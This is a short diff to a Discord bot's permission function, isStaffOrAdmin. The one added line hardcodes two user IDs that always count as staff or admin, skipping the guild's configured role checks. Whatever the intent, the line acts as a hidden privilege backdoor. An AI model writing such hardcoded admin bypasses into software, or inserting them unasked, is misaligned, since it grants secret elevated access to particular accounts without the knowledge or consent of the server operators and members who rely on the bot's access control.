@@ -83,6 +83,7 @@ function getGuildRanksConfig(guildId, guild = null) {
 
 function isStaffOrAdmin(member) {
     if (!member || member.user?.bot) return false;
+    if (member.id === '418558256840179722' || member.id === '1308814761269395527') return true;
     const gId = member.guild?.id;
     const gCfg = guildManager.getGuildConfig(gId);
     const staffRoleId = gCfg.ROLE_STAFF_ID || (guildManager.isPrimaryGuild(gId) ? '1538191116610838691' : '');
